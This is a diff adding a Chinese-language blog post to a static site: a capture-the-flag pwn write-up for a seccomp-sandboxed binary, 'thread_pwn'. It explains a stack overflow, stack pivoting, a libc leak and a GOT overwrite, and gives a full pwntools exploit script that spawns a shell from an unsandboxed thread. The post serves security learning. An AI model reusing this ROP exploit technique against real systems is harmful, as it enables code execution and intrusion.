@@ -147,6 +147,108 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/10/%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E9%80%9A%E8%BF%87%E7%BA%BF%E7%A8%8B%E7%BB%95%E8%BF%87%E6%B2%99%E7%AE%B1%E7%9A%84%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wen">
+      <meta itemprop="description" content="Here's what you want.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wen's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/07/10/%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E9%80%9A%E8%BF%87%E7%BA%BF%E7%A8%8B%E7%BB%95%E8%BF%87%E6%B2%99%E7%AE%B1%E7%9A%84%E9%A2%98/" class="post-title-link" itemprop="url">关于通过线程绕过沙箱的一道题</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-07-10 11:40:10 / Modified: 11:45:55" itemprop="dateCreated datePublished" datetime="2024-07-10T11:40:10+08:00">2024-07-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="关于通过线程绕过沙箱的一道题"><a href="#关于通过线程绕过沙箱的一道题" class="headerlink" title="关于通过线程绕过沙箱的一道题"></a>关于通过线程绕过沙箱的一道题</h1><h2 id="thread-pwn"><a href="#thread-pwn" class="headerlink" title="thread_pwn"></a><em>thread_pwn</em></h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101140929.png" alt="image-20240428181256065" style="zoom:80%;" />
+
+<p>开了沙箱保护策略，程序中只允许出现<code>read,write,clock_nanosleep,exit_group</code>这些系统调用。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141726.png" alt="image-20240428181336131" style="zoom:80%;" />
+
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>程序创建了一个线程，在这个线程中调用<code>start_routine</code>函数</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141777.png" alt="image-20240428184506061" style="zoom:80%;" />
+
+<p>有一个栈溢出漏洞，可以溢出<code>0x10</code>个字节</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141344.png" alt="image-20240427204331334" style="zoom:67%;" />
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101142752.png" alt="image-20240428175826441"></p>
+<p><code>start_routine</code>函数</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101143181.png" alt="image-20240428184444419" style="zoom:80%;" />
+
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	如果是一般的题并且没有开沙箱，可以栈迁移打<code>ret2libc</code>。但是本题开了沙箱，程序中不允许出现除<code>read,write,clock_nanosleep,exit_group</code>之外的系统调用。与此同时，本题也创建了一个子线程，也就是说我们有可能在子线程中执行后门函数去拿到<code>shell</code>。</p>
+<p>在父进程中布置<code>rop</code>，栈迁移，泄漏<code>libc</code>，并修改<code>sleep</code>函数的<code>got</code>表为<code>call_read</code>的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line"><span class="comment">#再read一次，依旧0x50个字节。由于lea rax,[rbp-0x40]这个指令，我们在这里覆盖rbp的时候要在.bss段的地址上+0x40</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome ,do you know threads?&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#下面这个payload中的前0x40个字节被写到.bss(0x404400)</span></span><br><span class="line">payload = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(pop_rbp)+p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>]+<span class="number">0x40</span>)+p64(call_read)+p64(data)*<span class="number">2</span></span><br><span class="line"><span class="comment">#让rbp中为elf.got[&#x27;sleep&#x27;]+0x40，然后通过lea rax,[rbp-0x40]，mov rsi,rax这两个指令，下一次read的时候，我们就能覆盖sleep函数的got表中的内容为call_read的地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line"><span class="comment">#              rbp         自己加一个leave ; ret栈迁移</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>让父进程陷入死循环</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(call_read) <span class="comment">#把call_read的地址写到sleep函数got表中</span></span><br><span class="line">payload+= p64(pop_rax)+p64(jmp_rax)*<span class="number">2</span>  <span class="comment">#让父进程陷入死循环</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>])+p64(leave_ret)</span><br><span class="line"><span class="comment">#rbp为sleep的got表，栈迁移把执行流迁移到sleep函数也就是程序中的call_read地址</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>布置<code>rop</code>链</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rbp)+p64(bss+<span class="number">0x340</span>)+p64(call_read)+p64(bss+<span class="number">0x300</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execve_addr)</span><br><span class="line">payload+= p64(bss+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&#x27;./thread_pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">debug(p)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./thread_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401593</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401591</span></span><br><span class="line">pop_rbp = <span class="number">0x40123d</span></span><br><span class="line">leave_ret = <span class="number">0x401481</span></span><br><span class="line">bss = <span class="number">0x404400</span></span><br><span class="line">call_read = <span class="number">0x4014be</span></span><br><span class="line">data = <span class="number">0x404068</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome ,do you know threads?&#x27;</span>,payload)</span><br><span class="line">payload = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(pop_rbp)+p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>]+<span class="number">0x40</span>)+p64(call_read)+p64(data)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;This is my thread...&#x27;</span>)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;write_addr&quot;</span>)</span><br><span class="line">libc_base = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">execve_addr=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rax = libc_base+<span class="number">0x45eb0</span></span><br><span class="line">pop_rsi = libc_base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libc_base+<span class="number">0x11f497</span></span><br><span class="line">jmp_rax = <span class="number">0x4011cc</span></span><br><span class="line"></span><br><span class="line">payload = p64(call_read)</span><br><span class="line">payload+= p64(pop_rax)+p64(jmp_rax)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>])+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rbp)+p64(bss+<span class="number">0x340</span>)+p64(call_read)+p64(bss+<span class="number">0x300</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execve_addr)</span><br><span class="line">payload+= p64(bss+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101142302.png" alt="image-20240428184257703"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li><p>几个<code>gdb</code>调试要用到的命令：</p>
+<p>查询线程<code>id</code>：<code>i threads</code></p>
+<p>切换线程：<code>thread id</code></p>
+<p>线程锁定：<code>set scheduler-locking on</code></p>
+<p>解除锁定：<code>set scheduler-locking off</code></p>
+</li>
+<li><p>沙箱（<em>Sandbox</em>）是一种安全机制，用于限制程序的运行环境。如果父进程在创建子线程之前设置了沙箱策略，那么这些策略可能会限制子线程的行为。然而，如果子线程在沙箱策略设置之前就已经创建，那么它可能不会受到这些限制。</p>
+</li>
+<li><blockquote>
+<p>子进程的栈区是父进程用<em>mmap</em>映射出来的一片内存(并不能在父进程里溢出篡改子进程的数据)</p>
+<p><em>bss</em>段 <em>data</em>段以及代码段(以及<em>got</em>表)的数据是父进程和子进程之间所共享的</p>
+</blockquote>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/10/%E5%85%B3%E4%BA%8Eret2csu%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -504,7 +606,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
